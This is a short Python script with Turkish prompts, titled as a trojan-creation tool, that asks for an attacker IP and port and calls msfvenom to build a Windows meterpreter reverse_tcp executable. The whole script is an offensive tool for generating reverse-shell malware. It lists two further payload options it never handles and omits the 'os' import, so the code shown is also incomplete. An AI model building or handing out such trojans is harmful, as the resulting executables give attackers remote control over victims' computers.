#!/usr/bin/env python
os.system("apt-get install figlet")
os.system("clear")
os.system("figlet TROJAN OLUSTURMA")

print("""
TROJAN OLUSTURMA aracına hosgeldiniz :)

""")

ip = raw_input("Local veya Dis Ip Gİrin: ")
port = raw_input("Port Gİrin: ")
print("""
1)windows/meterpreter/reverse_tcp
2)windows/meterpreter/reverse_http
3)windows/meterpreter/reverse_https
""")
payload = raw_input("Payload No Gİrin: ")
kayityeri = raw_input("Kayit Yeri Gİrin: ")
if(payload=="1"):
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe -o "+kayityeri)


    